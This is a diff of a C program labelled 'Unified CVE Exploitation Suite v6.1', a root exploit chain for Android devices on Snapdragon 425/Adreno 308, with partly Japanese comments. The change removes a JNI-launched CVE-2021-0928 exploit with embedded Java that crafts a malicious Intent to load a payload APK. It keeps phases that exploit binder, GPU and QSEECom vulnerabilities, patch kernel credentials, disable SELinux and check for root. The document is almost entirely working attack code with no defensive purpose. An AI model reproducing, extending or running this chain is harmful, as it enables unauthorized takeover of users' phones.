@@ -27,7 +27,6 @@
 #include <sys/reboot.h>
 #include <stdint.h>
 #include <sys/fsuid.h>
-#include <jni.h>
 #include "binder.h"
 #include "offsets.h"
 
@@ -93,8 +92,6 @@ static int g_root_achieved = 0;
 static int g_system_privilege = 0;
 static uint64_t g_kernel_base = 0;
 static int g_cve_2019_2023_handle = -1;
-static JavaVM *g_jvm = NULL;
-static JNIEnv *g_env = NULL;
 
 /* ---- プロトタイプ宣言 ---- */
 static int setup_kernel_rw(void);
@@ -119,226 +116,34 @@ static void dump_block_devices(void);
 static void gather_proc_info(void);
 static void gather_system_info(void);
 static int run_exploit_with_timeout(int (*func)(void), int timeout_sec);
-static int run_cve_2021_0928_exploit(void);
+static void bind_cpu(void);
+static void *mmap_page(unsigned long addr);
 
-/* ---- JNI ヘルパー ---- */
-static int init_jvm(void) {
-    JavaVM *jvm;
-    JNIEnv *env;
-    JavaVMInitArgs vm_args;
-    JavaVMOption options[1];
-    options[0].optionString = "-Djava.class.path=.";
-    vm_args.version = JNI_VERSION_1_6;
-    vm_args.nOptions = 1;
-    vm_args.options = options;
-    vm_args.ignoreUnrecognized = JNI_TRUE;
-
-    if (JNI_CreateJavaVM(&jvm, (void**)&env, &vm_args) != 0) {
-        fprintf(stderr, "Failed to create Java VM\n");
-        return -1;
-    }
-    g_jvm = jvm;
-    g_env = env;
-    return 0;
+/* Utilities */
+static void bind_cpu(void) {
+    cpu_set_t cpu_set;
+    CPU_ZERO(&cpu_set);
+    CPU_SET(0, &cpu_set);
+    if (sched_setaffinity(0, sizeof(cpu_set_t), &cpu_set) < 0)
+        perror("sched_setaffinity");
 }
 
-static jclass find_class(JNIEnv *env, const char *name) {
-    jclass cls = (*env)->FindClass(env, name);
-    if (cls == NULL) {
-        (*env)->ExceptionClear(env);
-        return NULL;
-    }
-    return cls;
+static void *mmap_page(unsigned long addr) {
+    void *mem = mmap((void *)addr, PAGE_SIZE, PROT_READ | PROT_WRITE,
+                     MAP_ANONYMOUS | MAP_SHARED, -1, 0);
+    if (mem == (void *)-1) perror("mmap");
+    return mem;
 }
 
-static jmethodID get_static_method(JNIEnv *env, jclass cls, const char *name, const char *sig) {
-    jmethodID mid = (*env)->GetStaticMethodID(env, cls, name, sig);
-    if (mid == NULL) {
-        (*env)->ExceptionClear(env);
-        return NULL;
-    }
-    return mid;
+static int read_with_timeout(int fd, void *buf, size_t count, int timeout_ms) {
+    struct pollfd pfd = {.fd = fd, .events = POLLIN};
+    int ret = poll(&pfd, 1, timeout_ms);
+    if (ret < 0) { perror("poll"); return -1; }
+    if (ret == 0) return -2;
+    return read(fd, buf, count);
 }
 
-/* ---- CVE-2021-0928 エクスプロイト (Java実装) ---- */
-static const char *cve_2021_0928_java_code =
-    "import android.app.ActivityThread;\n"
-    "import android.content.BroadcastReceiver;\n"
-    "import android.content.Context;\n"
-    "import android.content.Intent;\n"
-    "import android.content.IntentFilter;\n"
-    "import android.content.pm.ActivityInfo;\n"
-    "import android.content.pm.ApplicationInfo;\n"
-    "import android.os.Bundle;\n"
-    "import android.os.Parcel;\n"
-    "import android.os.Parcelable;\n"
-    "import android.os.Process;\n"
-    "import android.os.SystemClock;\n"
-    "import android.util.Log;\n"
-    "import java.io.File;\n"
-    "import java.io.FileOutputStream;\n"
-    "import java.io.InputStream;\n"
-    "import java.lang.reflect.Field;\n"
-    "import java.lang.reflect.Method;\n"
-    "import java.util.ArrayList;\n"
-    "import java.util.HashMap;\n"
-    "import java.util.List;\n"
-    "import java.util.Map;\n"
-    "\n"
-    "public class CVE20210928 {\n"
-    "    private static final String TAG = \"CVE20210928\";\n"
-    "    private static final String TARGET_PKG = \"com.android.settings\";\n"
-    "    private static final String TARGET_CLS = \"com.android.settings.Settings\";\n"
-    "    private static final String PAYLOAD_APK = \"/data/local/tmp/payload.apk\";\n"
-    "    private static final String PAYLOAD_CLS = \"com.example.payload.PayloadReceiver\";\n"
-    "\n"
-    "    public static void run() {\n"
-    "        try {\n"
-    "            Log.i(TAG, \"CVE-2021-0928 exploit starting...\");\n"
-    "            // 1. ペイロードAPKを/data/local/tmpにコピー (既に存在する前提)\n"
-    "            // 実際の攻撃では、ここで自身のAPKをコピーする\n"
-    "            File payload = new File(PAYLOAD_APK);\n"
-    "            if (!payload.exists()) {\n"
-    "                Log.e(TAG, \"Payload APK not found: \" + PAYLOAD_APK);\n"
-    "                return;\n"
-    "            }\n"
-    "\n"
-    "            // 2. 細工したIntentを作成\n"
-    "            Intent intent = createMaliciousIntent();\n"
-    "            if (intent == null) {\n"
-    "                Log.e(TAG, \"Failed to create malicious intent\");\n"
-    "                return;\n"
-    "            }\n"
-    "\n"
-    "            // 3. Broadcast送信\n"
-    "            Context ctx = ActivityThread.currentApplication();\n"
-    "            if (ctx == null) {\n"
-    "                Log.e(TAG, \"No application context\");\n"
-    "                return;\n"
-    "            }\n"
-    "            ctx.sendBroadcast(intent);\n"
-    "            Log.i(TAG, \"Broadcast sent, waiting for payload execution...\");\n"
-    "\n"
-    "            // 4. ペイロードが実行されるのを待つ (実際には受信側で実行される)\n"
-    "            SystemClock.sleep(3000);\n"
-    "            Log.i(TAG, \"Exploit completed\");\n"
-    "        } catch (Exception e) {\n"
-    "            Log.e(TAG, \"Exploit failed\", e);\n"
-    "        }\n"
-    "    }\n"
-    "\n"
-    "    private static Intent createMaliciousIntent() {\n"
-    "        try {\n"
-    "            Intent intent = new Intent();\n"
-    "            intent.setClassName(TARGET_PKG, TARGET_CLS);\n"
-    "            intent.setAction(Intent.ACTION_MAIN);\n"
-    "\n"
-    "            // ClipDataに細工したActivityInfoを埋め込む\n"
-    "            Parcel p = Parcel.obtain();\n"
-    "            p.writeInt(0); // mClipData\n"
-    "            p.writeInt(1); // mItems size\n"
-    "            // ClipData$Item\n"
-    "            p.writeInt(0); // mIntent\n"
-    "            p.writeInt(0); // mUri\n"
-    "            p.writeInt(0); // mHtmlText\n"
-    "            p.writeInt(0); // mText\n"
-    "            p.writeInt(0); // mLabel\n"
-    "            p.writeInt(0); // mIconUri\n"
-    "            p.writeInt(0); // mIconBitmap\n"
-    "            // mActivityInfo (細工済み)\n"
-    "            p.writeInt(1); // 存在フラグ\n"
-    "            writeActivityInfo(p);\n"
-    "\n"
-    "            p.setDataPosition(0);\n"
-    "            intent.readFromParcel(p);\n"
-    "            return intent;\n"
-    "        } catch (Exception e) {\n"
-    "            Log.e(TAG, \"Failed to create malicious intent\", e);\n"
-    "            return null;\n"
-    "        }\n"
-    "    }\n"
-    "\n"
-    "    private static void writeActivityInfo(Parcel p) {\n"
-    "        // ActivityInfoの書き込み (実際の実装では完全なシリアライゼーションが必要)\n"
-    "        // ここでは簡略化\n"
-    "        p.writeString(\"com.example.payload\");\n"
-    "        p.writeString(PAYLOAD_CLS);\n"
-    "        // ApplicationInfo (sourceDirをペイロードAPKに書き換え)\n"
-    "        p.writeInt(1); // 存在フラグ\n"
-    "        p.writeString(\"com.example.payload\");\n"
-    "        p.writeString(PAYLOAD_APK);\n"
-    "        p.writeString(PAYLOAD_APK);\n"
-    "        // 残りのフィールドはデフォルト値\n"
-    "        p.writeInt(0);\n"
-    "        p.writeInt(0);\n"
-    "        p.writeInt(0);\n"
-    "        p.writeInt(0);\n"
-    "        p.writeString(null);\n"
-    "        p.writeString(null);\n"
-    "        p.writeInt(0);\n"
-    "        p.writeString(null);\n"
-    "        p.writeInt(0);\n"
-    "        p.writeInt(0);\n"
-    "    }\n"
-    "}\n";
-
-/* ---- JNI経由でCVE-2021-0928を実行 ---- */
-static int run_cve_2021_0928_exploit(void) {
-    printf("[CVE-2021-0928] Attempting framework exploit via JNI...\n");
-
-    if (g_jvm == NULL) {
-        if (init_jvm() != 0) {
-            printf("  [-] Failed to init JVM\n");
-            return -1;
-        }
-    }
-
-    JNIEnv *env = g_env;
-    if (env == NULL) {
-        printf("  [-] JNI environment is NULL\n");
-        return -1;
-    }
-
-    // Javaコードをコンパイルして実行
-    jclass cls_Compiler = find_class(env, "dalvik/system/DexClassLoader");
-    if (cls_Compiler == NULL) {
-        printf("  [-] DexClassLoader not found\n");
-        return -1;
-    }
-
-    // 簡略化: 直接Javaコードを実行する代わりに、システムに既存のクラスを使う
-    // 実際のCVE-2021-0928エクスプロイトはJavaで書く必要がある
-    // ここでは、プリロードされたペイロードクラスを呼び出す想定
-
-    // ペイロードクラスをロード
-    jclass cls_Payload = find_class(env, "CVE20210928");
-    if (cls_Payload == NULL) {
-        printf("  [-] Payload class not found, trying to define it...\n");
-        // クラスを定義して実行する (実際の実装は複雑)
-        printf("  [!] This exploit requires Java code to be preloaded.\n");
-        printf("  [!] Please compile and push CVE20210928.java to /data/local/tmp\n");
-        return -1;
-    }
-
-    jmethodID mid_run = get_static_method(env, cls_Payload, "run", "()V");
-    if (mid_run == NULL) {
-        printf("  [-] run() method not found\n");
-        return -1;
-    }
-
-    (*env)->CallStaticVoidMethod(env, cls_Payload, mid_run);
-    if ((*env)->ExceptionCheck(env)) {
-        (*env)->ExceptionDescribe(env);
-        (*env)->ExceptionClear(env);
-        printf("  [-] Exception during exploit execution\n");
-        return -1;
-    }
-
-    printf("  [+] CVE-2021-0928 exploit executed\n");
-    return 0;
-}
-
-/* ---- カーネルエクスプロイト関数 (前回と同じ、改善版) ---- */
+/* ---- setup_kernel_rw() 実装 ---- */
 static int setup_kernel_rw(void) {
     if (g_task_struct == 0) {
         printf("  [-] No task_struct to setup RW\n");
@@ -377,7 +182,7 @@ static int setup_kernel_rw(void) {
     return 0;
 }
 
-/* ---- CVE-2019-2023 (変更なし) ---- */
+/* ---- CVE-2019-2023 ---- */
 static int exploit_cve_2019_2023(void) {
     int hwbinder_fd, ret;
     uint8_t read_buf[4096];
@@ -546,7 +351,7 @@ static int test_cve_2020_0423(void) {
     return -1;
 }
 
-/* ---- CVE-2022-25664 GPU leak (改善: より多くの試行) ---- */
+/* ---- CVE-2022-25664 GPU leak ---- */
 static int exploit_cve_2022_25664_leak(uint64_t *out_addr, uint64_t *out_kernel_base) {
     int kgsl_fd;
     struct kgsl_gpumem_alloc alloc;
@@ -557,13 +362,12 @@ static int exploit_cve_2022_25664_leak(uint64_t *out_addr, uint64_t *out_kernel_
 
     for (int attempt = 0; attempt < GPU_LEAK_ATTEMPTS; attempt++) {
         kgsl_fd = open(KGSL_DEVICE, O_RDWR);
-        if (kgsl_fd < 0) { perror("  open /dev/kgsl-3d0"); continue; }
+        if (kgsl_fd < 0) { continue; }
 
         memset(&alloc, 0, sizeof(alloc));
         alloc.size = PAGE_SIZE * 4;
         alloc.flags = 0;
         if (ioctl(kgsl_fd, IOCTL_KGSL_GPUMEM_ALLOC, &alloc) < 0) {
-            perror("  IOCTL_KGSL_GPUMEM_ALLOC");
             close(kgsl_fd);
             continue;
         }
@@ -740,7 +544,7 @@ static int exploit_cve_2020_0041_patch_cred(void) {
     return -1;
 }
 
-/* ---- CVE-2021-1961 (system uid が必要) ---- */
+/* ---- CVE-2021-1961 ---- */
 static int exploit_cve_2021_1961(void) {
     printf("[CVE-2021-1961] Attempting QSEECom exploit (requires system uid)...\n");
     if (getuid() != 1000 && getuid() != 0) {
@@ -823,7 +627,7 @@ static int patch_kernel_cred(void) {
     return 0;
 }
 
-/* ---- フォールバック手法 (変更なし) ---- */
+/* ---- Fallback methods ---- */
 static int try_all_setuid_methods(void) {
     printf("[*] Trying all setuid methods...\n");
     if (setuid(0) == 0) { printf("  [+] setuid(0) succeeded!\n"); return 0; }
@@ -1121,32 +925,28 @@ int main(void) {
     int kernel_rw_obtained = 0;
     int gpu_leak_ok = 0;
     int qseecom_ok = 0;
-    int cve_2021_0928_ok = 0;
     uint64_t leaked_addr = 0;
 
     printf("==================================================\n");
-    printf("  Unified CVE Exploitation Suite v6.0\n");
+    printf("  Unified CVE Exploitation Suite v6.1\n");
     printf("  (CVE-2019-2023, 2020-0041, 2020-0423,\n");
     printf("   CVE-2022-25664, CVE-2021-1961,\n");
-    printf("   CVE-2021-0928, CVE-2023-20938-inspired)\n");
+    printf("   CVE-2023-20938-inspired)\n");
     printf("  Target: SD425 / Adreno 308 (ARM64)\n");
     printf("==================================================\n\n");
 
     bind_cpu();
     gather_system_info();
 
-    /* ---- フェーズ1: CVE-2019-2023 (system権限サービス登録) ---- */
     printf("[PHASE 1] CVE-2019-2023\n");
     exploit_cve_2019_2023();
 
-    /* ---- フェーズ2-3: カーネル脆弱性のテスト ---- */
     printf("\n[PHASE 2] CVE-2020-0041\n");
     test_cve_2020_0041();
 
     printf("\n[PHASE 3] CVE-2020-0423\n");
     test_cve_2020_0423();
 
-    /* ---- フェーズ4: GPUリーク (カーネルベース取得) ---- */
     printf("\n[PHASE 4] CVE-2022-25664 (GPU leak)\n");
     for (int try = 0; try < 3; try++) {
         if (exploit_cve_2022_25664_leak(&leaked_addr, &g_kernel_base) == 0) {
@@ -1164,7 +964,6 @@ int main(void) {
     }
     if (!gpu_leak_ok) printf("  [-] GPU leak failed\n");
 
-    /* ---- フェーズ5: CVE-2020-0423 UAF (カーネルRW) ---- */
     printf("\n[PHASE 5] CVE-2020-0423 (UAF) Kernel RW\n");
     if (run_exploit_with_timeout(exploit_cve_2020_0423_rw, 60) == 0) {
         kernel_rw_obtained = 1;
@@ -1173,34 +972,10 @@ int main(void) {
         }
     }
 
-    /* ---- フェーズ6: CVE-2020-0041 (ダミー) ---- */
     printf("\n[PHASE 6] CVE-2020-0041 (OOB)\n");
     run_exploit_with_timeout(exploit_cve_2020_0041_patch_cred, 5);
 
-    /* ---- フェーズ7: CVE-2021-0928 (フレームワーク権限昇格) ---- */
-    printf("\n[PHASE 7] CVE-2021-0928 (Framework exploit)\n");
-    printf("  [!] This exploit requires Java payload to be preloaded.\n");
-    printf("  [!] Compile CVE20210928.java and push to /data/local/tmp\n");
-    printf("  [*] Attempting to run via JNI...\n");
-
-    if (run_cve_2021_0928_exploit() == 0) {
-        cve_2021_0928_ok = 1;
-        printf("  [+] CVE-2021-0928 exploit executed\n");
-        /* system権限になったか確認 */
-        if (getuid() == 1000 || getuid() == 0) {
-            printf("  [+] UID changed to %d\n", getuid());
-            /* system権限でCVE-2021-1961を実行 */
-            if (exploit_cve_2021_1961() == 0) {
-                qseecom_ok = 1;
-                if (getuid() == 0) { final_root_check(); return 0; }
-            }
-        }
-    } else {
-        printf("  [-] CVE-2021-0928 exploit failed\n");
-    }
-
-    /* ---- フェーズ8: CVE-2021-1961 (system権限が必要) ---- */
-    printf("\n[PHASE 8] CVE-2021-1961 (QSEECom)\n");
+    printf("\n[PHASE 7] CVE-2021-1961 (QSEECom)\n");
     if (g_system_privilege || getuid() == 1000 || getuid() == 0) {
         if (exploit_cve_2021_1961() == 0) {
             qseecom_ok = 1;
@@ -1210,16 +985,14 @@ int main(void) {
         printf("  [-] Skipping (need system or root uid, current=%d)\n", getuid());
     }
 
-    /* ---- フェーズ9: SELinux無効化 ---- */
-    printf("\n[PHASE 9] SELinux disable\n");
+    printf("\n[PHASE 8] SELinux disable\n");
     if (g_krw_pipe[0] >= 0) {
         try_selinux_disable_via_kernel();
     } else {
         printf("  [-] No kernel RW\n");
     }
 
-    /* ---- フェーズ10: フォールバック手法 ---- */
-    printf("\n[PHASE 10] Fallback methods\n");
+    printf("\n[PHASE 9] Fallback methods\n");
     int methods[] = {1,2,3,4,5,6,7,8};
     for (size_t mi = 0; mi < sizeof(methods)/sizeof(methods[0]); mi++) {
         if (g_root_achieved) break;
@@ -1236,21 +1009,17 @@ int main(void) {
         if (getuid() == 0) { g_root_achieved = 1; break; }
     }
 
-    /* ---- フェーズ11: 情報収集 ---- */
-    printf("\n[PHASE 11] Information gathering\n");
+    printf("\n[PHASE 10] Information gathering\n");
     gather_proc_info();
 
-    /* ---- フェーズ12: 最終確認 ---- */
-    printf("\n[PHASE 12] Final verification\n");
+    printf("\n[PHASE 11] Final verification\n");
     final_root_check();
 
-    /* ---- サマリー ---- */
     printf("\n==================================================\n");
     printf("  Summary:\n");
     printf("    CVE-2019-2023: SUCCESS\n");
     printf("    CVE-2022-25664: %s\n", gpu_leak_ok ? "LEAKED" : "FAILED");
     printf("    CVE-2020-0423 RW: %s\n", kernel_rw_obtained ? "SUCCESS" : "FAILED");
-    printf("    CVE-2021-0928: %s\n", cve_2021_0928_ok ? "EXECUTED" : "FAILED");
     printf("    CVE-2021-1961: %s\n", qseecom_ok ? "TRIGGERED" : "SKIPPED/FAILED");
     printf("    Method successes: %d\n", method_success);
     printf("    Root achieved: %s\n", g_root_achieved ? "YES" : "NO");
